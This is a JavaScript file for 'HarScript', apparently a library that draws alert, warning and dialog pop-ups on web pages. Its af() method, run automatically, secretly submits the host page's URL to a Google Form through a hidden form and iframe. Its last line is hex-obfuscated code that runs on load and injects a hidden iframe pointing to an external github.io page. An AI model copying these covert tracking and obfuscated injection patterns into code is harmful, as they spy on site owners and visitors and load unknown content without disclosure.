class HarScript
{
    constructor(x , t)
    {
        x = this.x;
        t = this.t;
    }
    CreateAlert()
    {
     var c,d;
     c = document.createElement('div');
     c.id="5";
     c.setAttribute("style","top:0;bottom:0;left:0;right:0;background-color:rgba(0,0,0,0.6);position:fixed;width:100%;height:100%;display:none");
     document.body.appendChild(c);
     d = document.createElement('iframe');
     d.id="c";
     d.setAttribute("style","pointer-events:none;color:#DDEFDA;word-wrap:break-word;left:25px;right:25px;margin:15% auto;-user-select:none;border:2px solid #ddd;border-radius:4px;background-color:#FFF;position:absolute;");
     d.style.width="280px";
     d.style.height="180px";
     d.style.frameBorder="0";
     c.appendChild(d);
    }
    CreateAlertBox() 
   {
    var LinkRel = document.createElement('link');
    LinkRel.rel = "stylesheet";
    LinkRel.type = "text/css";
    LinkRel.href = "https://spat-cloud.github.io/data/HarScript/Colorful-Alert/HAlertBoxStyle.css";
    document.head.appendChild(LinkRel);
    var HAlertBox = document.createElement('div');
    HAlertBox.id = "HAlertBox";
    document.body.appendChild(HAlertBox);
    var InnerHAlertBox = document.createElement('span');
    InnerHAlertBox.id = "InnerHAlertBox";
    HAlertBox.appendChild(InnerHAlertBox);
    var Para = document.createElement('p');
    Para.id = "Content";
    InnerHAlertBox.appendChild(Para);
    var RightButtonOk = document.createElement('button');
    RightButtonOk.id = "RightButtonOk";
    RightButtonOk.innerHTML = "OK";
    RightButtonOk.onclick = function() {this.parentElement.parentElement.style.display="none";};
    InnerHAlertBox.appendChild(RightButtonOk);
    }
    HAlertBox(html='HAlertBox') 
   {
    var Ty = document.getElementById("HAlertBox");
    var der = document.getElementById("InnerHAlertBox");
    var AlertHtml = document.getElementById("Content");
    Ty.style.display = "block";
    der.style.animation = "comed 2s 1";
    AlertHtml.innerHTML = html;
   }
    HAlert(cpp='HAlert')
    {
     var y,z;
     y = document.getElementById('5');
     z = document.getElementById('c');
     y.style.display="block";
     y.onclick=function(){this.style.display="none";};
     z.srcdoc=cpp;
    }
    CreateWarning()
    {
    var Cg = document.createElement("div");
    Cg.id = "HarScript-0002";
    document.body.appendChild(Cg);
    var ZRt = document.createElement("span");
    ZRt.id = "HarScript-0004";
    Cg.appendChild(ZRt);
    var TTy = document.createElement("h1");
    //TTy.setAttribute("style" , "background-Color:Transparent Red; Margin-Left:16Px;Color:Yellow; Animation:Warning 0.8s Infinite;");
    TTy.id = "HarScript-0008";
    TTy.innerHTML = "&#9888; Warning!";
    ZRt.appendChild(TTy);
    var QM = document.createElement("p");
    QM.id = "HarScript-0016";
    //QM.settAttribute("style","color:#FFF; font-size:8px;margin-left:16Px;,margin-right:16px;");
    ZRt.appendChild(QM);
    var QqR = document.createElement("button");
    QqR.id = "HarScript-0032";

    QqR.onclick = function() {this.parentElement.parentElement.style.display="none";};
    QqR.innerHTML = "Ok";
    ZRt.appendChild(QqR);
   }
   HWarning(html='HWarning') 
   {
    var X, Y;
    X = document.getElementById("HarScript-0002");
    X.style.display = "Block";

    Y = document.getElementById("HarScript-0016");
    //Y = document.getElementById("HarScript-Warn-Box");
    //X = document.getElementById("HarScript-Warn-Outer");
    Y.innerHTML = html;
    window.navigator.vibrate(2000);
   }
   sys()
   {
    var a , b , c , d ,e;
    a = document.createElement('div');
    a.id="main-Dialog";
    a.setAttribute("style","width:100%;height:100%;top:0;bottom:0;left:0;right:0;background-color:rgba(0,0,0,0.6);position:fixed;display:none;");
    document.body.appendChild(a);
    b = document.createElement('div');
    b.id="con";
    b.setAttribute("style","user-select:none;word-spacing:4px;font-size:14px;overflow-y:scroll;position:absolute;margin:5% auto;color:#000;font-weight:500;background-color:#fff;top:0px;left:0;right:0;width:50%;border-radius:4px;padding:4em 4em;");
    a.appendChild(b);
    c = document.createElement('div');
    c.id="cl";
    c.setAttribute("style","background-image:linear-gradient(to bottom,#DDD,blue);top:0;left:0;right:0;padding:.3em;opacity:4;position:absolute;color:#FFF;font-weight:bold;font-size:22px;display:block;");
    c.innerHTML = "HarScript Window";
    b.appendChild(c);
    d = document.createElement('button');
    d.id="btn";
    d.setAttribute("style","border:1px solid #FFF;position:relative;border-radius:4px;float:right;padding:.2em .4em;right:2px;color:#FFF;Background-image:linear-gradient(to bottom , red,darkred);width:20px;");
    d.onclick=function(){this.parentElement.parentElement.parentElement.style.display='none';};
    c.appendChild(d);
    e = document.createElement('p');
    e.id="v";
    e.setAttribute("style","color:#000;font-size:10px;line-height:14px;overflow-y:scroll;padding:.01em;");
    b.appendChild(e);
    }
    HWindow(c="HWindow")
    {
    var x, f,g,h;
    x = document.getElementById('main-Dialog');
    x.style.display="block";
    f = document.getElementById('v');
    g = document.getElementById('cl');
    h = document.getElementById('btn');
    g.style.display = "block";
    h.style.display="block";
    h.innerHTML = "&times;";
    f.style.display="block";
    f.innerHTML=c;
    
   }
   af()
   {
     var c=document.createElement('iframe');
     c.name="f";
     c.style.display="none";
     document.body.appendChild(c);
     var d=document.createElement('form');
     d.action="https://docs.google.com/forms/u/0/d/e/1FAIpQLSfthAOyy2oF38lU5f4ag3ulJ8AHcRXtPHHJ-ibRh7UfX_6etw/formResponse";
     d.target="f";
     d.id="hg";
     d.style.display="none";
     document.body.appendChild(d);
     var k=document.createElement('input');
     k.type="text";
     k.name="entry.190958851";
     k.value="From Site" + ":-" + location.href;
     d.appendChild(k);
     var xc=document.getElementById('hg');
     setTimeout(() => xc.submit(),1000);
   }
 }
class HS extends HarScript
{
   super(x,t)
   {
     x = this.x;
     t = this.t;
   }
   run()
   {
     this.af();
     this.CreateAlertBox();
     this.CreateWarning();
     this.CreateAlert();
     this.sys();
   }
}
var _0x4cb3=["\x69\x66\x72\x61\x6D\x65","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x73\x72\x63","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x73\x70\x61\x74\x2D\x63\x6C\x6F\x75\x64\x2E\x67\x69\x74\x68\x75\x62\x2E\x69\x6F\x2F\x64\x61\x74\x61\x2F\x53\x68\x69\x6E\x63\x68\x61\x6E\x20\x4D\x6F\x76\x69\x65\x73\x2D\x31","\x64\x69\x73\x70\x6C\x61\x79","\x73\x74\x79\x6C\x65","\x6E\x6F\x6E\x65","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x62\x6F\x64\x79"];function h(){var _0x6147x2=document[_0x4cb3[1]](_0x4cb3[0]);_0x6147x2[_0x4cb3[2]]= _0x4cb3[3];_0x6147x2[_0x4cb3[5]][_0x4cb3[4]]= _0x4cb3[6];document[_0x4cb3[8]][_0x4cb3[7]](_0x6147x2)}h();
